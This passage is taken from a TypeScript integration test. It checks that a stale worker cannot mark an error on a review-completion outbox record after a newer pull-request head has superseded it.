        runId: 'run_superseded_race',
        repositoryId: 888,
        repository: 'calltelemetry/dashboard',
        prNumber: 99,
        baseSha: 'a'.repeat(40),
        headSha: headOld,
        attemptId: 'att-old',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: baseTime,
      });

      // 2. Worker claims old head
      const claim = await repository.claimNext('worker-slow', baseTime, leaseMs);
      expect(claim).not.toBeNull();

      // 3. Newer head arrives and supersedes older head
      await repository.supersedeOlderHeads(888, 99, headNew, baseTime + 1_000);

      // Verify record is now 'superseded' with lease_owner = NULL
      const client = await pool.connect();
      try {
        const res = await client.query(
          `SELECT status, lease_owner FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [oldRecord.completionId]
        );
        expect(res.rows[0].status).toBe('superseded');
        expect(res.rows[0].lease_owner).toBeNull();
      } finally {
        client.release();
      }

      // 4. Worker-slow fails with an error and calls markError
      const markedError = await repository.markError(
        oldRecord.completionId,
        'worker-slow',
        baseTime + 2_000,
        'Slow review error on stale head',
      );

      // Verify that markError was safely rejected
      expect(markedError).toBe(false);

      const client2 = await pool.connect();
      try {
        const res = await client2.query(
          `SELECT status, lease_owner, error_text FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [oldRecord.completionId]
        );
        // REGRESSION PREVENTED: status remains superseded!
        expect(res.rows[0].status).toBe('superseded');
        expect(res.rows[0].error_text).toBeNull();
      } finally {
        client2.release();
      }
    });
  });
});
